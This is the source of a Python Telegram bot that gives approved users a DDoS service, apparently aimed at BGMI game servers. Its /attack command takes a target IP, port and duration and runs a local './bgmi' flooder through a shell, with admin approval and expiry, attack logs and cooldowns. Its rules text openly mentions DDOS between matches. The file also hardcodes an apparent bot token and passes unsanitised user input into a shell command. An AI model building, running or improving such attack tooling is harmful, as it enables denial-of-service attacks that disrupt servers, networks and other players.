import os
import subprocess
import threading
import json
from datetime import datetime, timedelta, timezone
from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext

admins = [5347809540, 6663210749]
approved_users = {}
attack_history = {}
active_attacks = {}
bgmi_cooldown = {}
if os.path.exists("approved_users.json"):
    with open("approved_users.json", "r") as f:
        approved_users = json.load(f)

if os.path.exists("attack_history.json"):
    with open("attack_history.json", "r") as f:
        attack_history = json.load(f)

def save_data():
    with open("approved_users.json", "w") as f:
        json.dump(approved_users, f)
    with open("attack_history.json", "w") as f:
        json.dump(attack_history, f)

def start(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in approved_users:
    
        update.message.reply_text("*🌍 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐛𝐨𝐭! 𝐔𝐬𝐞 /start 𝐭𝐨 𝐛𝐞𝐠𝐢𝐧 𝐲𝐨𝐮𝐫 𝐣𝐨𝐮𝐫𝐧𝐞𝐲: 🎉\n\n"
                                           "🚀 Get ready to dive into the action!\n\n"
                                           "💣 To unleash your power, use the `/attack <ip> <port> <duration>`` command followed by your target's IP and port. ⚔️\n\n"
                                           "🔍 Example: After `/attack`, enter: `ip port duration`.\n\n"
                                           "🔥 Ensure your target is locked in before you strike!\n\n"
                                           "📚 New around here? Check out the `/help` command to discover all my capabilities. 📜\n\n"
                                           "⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign! 😈💥*", parse_mode='Markdown')
    else:
        update.message.reply_text("🫥𝗣𝗔𝗜𝗟𝗘 𝗔𝗗𝗠𝗜𝗡 𝗦𝗘 𝗣𝗘𝗥𝗠𝗜𝗦𝗦𝗜𝗢𝗡 𝗟𝗘𝗞𝗘 𝗔𝗔🙄")
                                  
                                               
def help_command(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. */Attack - ⚔️ Launch a powerful attack and show your skills!*\n"
                 "2. */Contact_Admin - 📞 Get in touch with the mastermind behind this bot!*\n"
                 "3. */Rules - 📜 Review the rules to keep the game fair and fun.*\n\n"
                 "4. */Admin_commands - 🗿 This command only for bot admins so don't try other user*\n\n"
                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*", parse_mode='Markdown') 

def admin_mods(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in admins:
        update.message.reply_text("*🌟 Welcome Dear Admin to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. */approve - 👤You can use this command to approve user to using our bot!*\n"
                 "2. */disapprove - ❗ This command disapprove from the using our bot.*\n"
                 "3. */show_attack - 😂Show all user attack history*\n"
                 "4. */list - 📝 Show all approved user details*\n"
                 "5. */restart - 🤖 Restart the bot for maintenance when some command not working*\n\n"
                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*", parse_mode='Markdown')
    else:
        update.message.reply_text("☠️𝙰𝙳𝙼𝙸𝙽 𝙷𝙰𝙸 𝙺𝙸𝚈𝙴 𝚃𝚄 𝙽𝙾𝙾𝙱😑")        

def approve(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("☠️𝙰𝙳𝙼𝙸𝙽 𝙷𝙰𝙸 𝙺𝙸𝚈𝙴 𝚃𝚄 𝙽𝙾𝙾𝙱😑")
        return

    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        approved_users[target_id] = {
            "approved_date": str(datetime.now()),
            "expires_on": str(datetime.now() + timedelta(days=days))
        }
        save_data()
        update.message.reply_text(f"*🎉 Congratulations!*\n"
                    f"*User {target_id} has been approved!*\n"
                    f"*For {days} days!*\n"
                    f"*Welcome to our community! Let’s make some magic happen! ✨*", parse_mode='Markdown')
    except (IndexError, ValueError):
        update.message.reply_text("𝑼𝒔𝒂𝒈𝒆: /approve <user_id> <days>")
        

def disapprove(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("☠️𝙰𝙳𝙼𝙸𝙽 𝙷𝙰𝙸 𝙺𝙸𝚈𝙴 𝚃𝚄 𝙽𝙾𝙾𝙱😑")
        return

    try:
        target_id = int(context.args[0])
        if target_id in approved_users:
            del approved_users[target_id]
            save_data()
            update.message.reply_text(f"*❌ Disapproval Notice!*\n"
                    f"*User {target_id} has been disapproved.*\n"
                    f"*They have been reverted to free access.*\n"
                    f"*Encourage them to try again soon! 🍀*", parse_mode='Markdown')
        else:
            update.message.reply_text("⛔𝑼𝒔𝒆𝒓 𝒊𝒔 𝒏𝒐𝒕 𝒂𝒑𝒑𝒓𝒐𝒗𝒆𝒅.")
    except (IndexError, ValueError):
        update.message.reply_text("𝑼𝒔𝒂𝒈𝒆: /disapprove <user_id>")

def list_approved(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("☠️𝙰𝙳𝙼𝙸𝙽 𝙷𝙰𝙸 𝙺𝙸𝚈𝙴 𝚃𝚄 𝙽𝙾𝙾𝙱😑")
        return

    if approved_users:
        message = "♻️Aᴘᴘʀᴏᴠᴇᴅ Usᴇʀs::\n"
        for uid, data in approved_users.items():
            days_left = (datetime.strptime(data['expires_on'], "%Y-%m-%d %H:%M:%S.%f") - datetime.now()).days
            message += f"🪪𝔘𝔰𝔢𝔯 ℑ𝔇: {uid}, 🗓️𝕯𝖆𝖞𝖘 𝕷𝖊𝖋𝖙: {days_left}\n"
        update.message.reply_text(message)
    else:
        update.message.reply_text("𝙽𝚘 𝚊𝚙𝚙𝚛𝚘𝚟𝚎𝚍 𝚞𝚜𝚎𝚛𝚜 𝚏𝚘𝚞𝚗𝚍❓")

def attack(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in approved_users:
        update.message.reply_text("🫥𝗣𝗔𝗜𝗟𝗘 𝗔𝗗𝗠𝗜𝗡 𝗦𝗘 𝗣𝗘𝗥𝗠𝗜𝗦𝗦𝗜𝗢𝗡 𝗟𝗘𝗞𝗘 𝗔𝗔🙄")
        return

    try:
        ip = context.args[0]
        port = context.args[1]
        duration = int(context.args[2])
        
        if duration >= 901:
            update.message.reply_text("*⏳ Maximum duration is 900 seconds.*\n"  # Duration limit message
                                               "*🔉Please shorten the duration and try again!*", parse_mode='Markdown')  # Shorten duration message
            return   
            
        user_id = update.effective_user.id
        if user_id not in admins:
          if user_id in bgmi_cooldown and (datetime.now() - bgmi_cooldown[user_id]).seconds < 420:
            update.message.reply_text("*⚠️ Please wait because another attack is running!*\n\n"  # Busy message
                                       "*🧊You are now cooldown wait 7 min than use next attack*", parse_mode='Markdown')  # Check remaining time
            return
               
        bgmi_cooldown[user_id] = datetime.now()

        # Notify attack started
        update.message.reply_text(f"🚀𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿🚀\n\n📡 𝑻𝒂𝒓𝒈𝒆𝒕 𝑯𝒐𝒔𝒕: {ip}\n🔌 𝙏𝙖𝙧𝙜𝙚𝙩 𝙋𝙤𝙧𝙩: {port}\n⏰ 𝗧𝗶𝗺𝗲: {duration} 𝑺𝒆𝒄𝒐𝒏𝒅𝒔! 𝐿𝑒𝑡 𝑡𝒉𝑒 𝑐𝒉𝑎𝑜𝑠 𝑢𝑛𝑓𝑜𝑙𝑑! 🔥")

        command = f"./bgmi {ip} {port} {duration} 75 445579094926"
        process = subprocess.Popen(command, shell=True)
        attack_history.setdefault(str(user_id), []).append({"ip": ip, "port": port, "time": duration, "start_time": str(datetime.now())})
        save_data()


        def end_attack():
            process.kill()
            update.message.reply_text(f"🏁𝑨𝒕𝒕𝒂𝒄𝒌 𝑭𝒊𝒏𝒊𝒔𝒉𝒆𝒅.🏁\n\n🎯𝑻𝒂𝒓𝒈𝒆𝒕🎯: {ip}\n🛜𝑷𝒐𝒓𝒕🛜: {port}\n⌛𝙏𝙞𝙢𝙚⏳: {duration} 𝖲𝖾𝖼𝗈𝗇𝖽𝗌")
        
        timer = threading.Timer(duration, end_attack)
        timer.start()
        
    except (IndexError, ValueError):
        update.message.reply_text("*💣 Ready to launch an attack?*\n"  # Ready to launch message
                                   "*Please provide the target IP, port, and duration in seconds.*\n"  # Provide details message
                                   "*Example: /Attack or /bgmi 2.24.19.4 10252 60* 🔥\n"  # Example message
                                   "*Let the chaos begin! 🎉*", parse_mode='Markdown')  # Start chaos m{}essage
          

def show_attacks(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id not in admins:
        update.message.reply_text("☠️𝙰𝙳𝙼𝙸𝙽 𝙷𝙰𝙸 𝙺𝙸𝚈𝙴 𝚃𝚄 𝙽𝙾𝙾𝙱😑")
        return

    message = "💾𝐴𝑡𝑡𝑎𝑐𝑘 𝐻𝑖𝑠𝑡𝑜𝑟𝑦 (𝐿𝑎𝑠𝑡 2⃣4⃣ 𝒉𝑜𝑢𝑟𝑠. ⏳):\n"
    now = datetime.now()
    for uid, attacks in attack_history.items():
        attacks_in_24h = [a for a in attacks if (now - datetime.strptime(a['start_time'], "%Y-%m-%d %H:%M:%S.%f")).total_seconds() < 86400]
        message += f"🪪𝔘𝔰𝔢𝔯 ℑ𝔇: {uid}, 📟ɴᴜᴍʙᴇʀ ᴏғ ᴀᴛᴛᴀᴄᴋs: {len(attacks_in_24h)}\n"
    
    update.message.reply_text(message)
    
def handle_contact_admin(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("📞 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 𝙾𝚆𝙽𝙴𝚁 𝚂𝙴𝙻𝙴𝙲𝚃𝙴𝙳")
    update.message.reply_text("*👤 **Owner Information:**\n\n"
        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
        "📩 **Telegram:** @DONATE_OWNER_BOT\n\n"
        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n", parse_mode='Markdown')
        
def rules(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in approved_users:
        update.message.reply_text("*Get all important rules🧾*", parse_mode='Markdown')
        update.message.reply_text("*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!*", parse_mode='Markdown')
    else:
        update.message.reply_text("🫥𝗣𝗔𝗜𝗟𝗘 𝗔𝗗𝗠𝗜𝗡 𝗦𝗘 𝗣𝗘𝗥𝗠𝗜𝗦𝗦𝗜𝗢𝗡 𝗟𝗘𝗞𝗘 𝗔𝗔🙄")    

def contact_admin(update: Update, context: CallbackContext) -> None:
    update.message.reply_text("📞 𝙲𝙾𝙽𝚃𝙰𝙲𝚃 𝙾𝚆𝙽𝙴𝚁 𝚂𝙴𝙻𝙴𝙲𝚃𝙴𝙳")
    update.message.reply_text("*👤 **Owner Information:**\n\n"
        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
        "📩 **Telegram:** @DONATE_OWNER_BOT\n\n"
        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n", parse_mode='Markdown')
  
def restart(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    if user_id in admins:
        update.message.reply_text("*⚠️ Wait sometime because restart in progress*", parse_mode='Markdown')
        os.execl(sys.executable, sys.executable, *sys.argv)
    else:
        update.message.reply_text("☠️𝙰𝙳𝙼𝙸𝙽 𝙷𝙰𝙸 𝙺𝙸𝚈𝙴 𝚃𝚄 𝙽𝙾𝙾𝙱😑")

def main():

    updater = Updater("7501952159:AAHuHk9O98ao0kM94BrGJfwc1M_Lagkr0sg", use_context=True)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler(['help'], help_command))
    dispatcher.add_handler(CommandHandler("approve", approve))
    dispatcher.add_handler(CommandHandler("disapprove", disapprove))
    dispatcher.add_handler(CommandHandler("list", list_approved))
    dispatcher.add_handler(CommandHandler(['Rules', 'rules'], rules))
    dispatcher.add_handler(CommandHandler(['bgmi', 'Attack', 'attack'], attack))
    dispatcher.add_handler(CommandHandler("show_attack", show_attacks))
    dispatcher.add_handler(CommandHandler(['Contact_Admin', 'contact_admin'], contact_admin))
    dispatcher.add_handler(CommandHandler("restart", restart))
    dispatcher.add_handler(CommandHandler(['Admin_commands', 'admin_commands'], admin_mods))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()